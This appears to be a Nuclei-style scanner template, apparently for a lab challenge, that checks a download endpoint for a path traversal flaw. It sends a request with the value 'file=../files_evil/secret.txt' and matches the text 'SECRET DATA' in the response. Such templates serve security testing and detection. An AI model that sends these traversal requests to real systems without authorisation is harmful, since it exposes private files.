id: ch2-sensitive-file-read

info:
  name: Sensitive file disclosure via insecure path validation
  author: vignesh
  severity: high
  description: Application allows reading files outside the intended directory, exposing sensitive content

requests:
  - method: GET
    path:
      - "{{BaseURL}}/download?file=../files_evil/secret.txt"

    matchers:
      - type: word
        part: body
        words:
          - "SECRET DATA"
